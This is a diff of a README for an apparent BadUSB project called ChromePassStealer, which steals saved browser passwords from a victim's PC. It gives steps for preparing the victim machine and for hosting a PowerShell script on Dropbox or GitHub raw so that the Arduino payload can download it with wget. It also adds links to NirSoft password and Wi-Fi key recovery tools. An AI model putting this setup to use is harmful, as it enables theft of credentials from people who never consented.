@@ -56,7 +56,7 @@ cd ChromePassStealer
 ## Requirments for victim PC
 * Turn off caps lock.
 * Switch the keyboard layout to French (or adapt the code according to your layout).
-# How to set a link for wget the script
+# How to set a link for wget the script ⬇️
 ## Dropbox
 1. Create a dropbox account [here](https://www.dropbox.com);
 
@@ -77,3 +77,9 @@ cd ChromePassStealer
 4. Go to the ciaoV2.ps1 page and click on RAW button;
 
 5. Copy the link of the RAW page and put it in the [BadUSB_passStealer.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) file;
+# Nirsoft tools 🧰
+You can download nirsoft tools below if you want :
+* [WebBrowserPassView.exe (User : download ; Password : nirsoft123!)](https://www.nirsoft.net/protected_downloads/passreccommandline.zip);
+* [WNetWatcher.exe](https://www.nirsoft.net/utils/wireless_network_watcher.html);
+* [BrowsingHistoryView.exe](https://www.nirsoft.net/utils/browsing_history_view.html);
+* [WirelessKeyView.exe](https://www.nirsoft.net/utils/wireless_key.html);
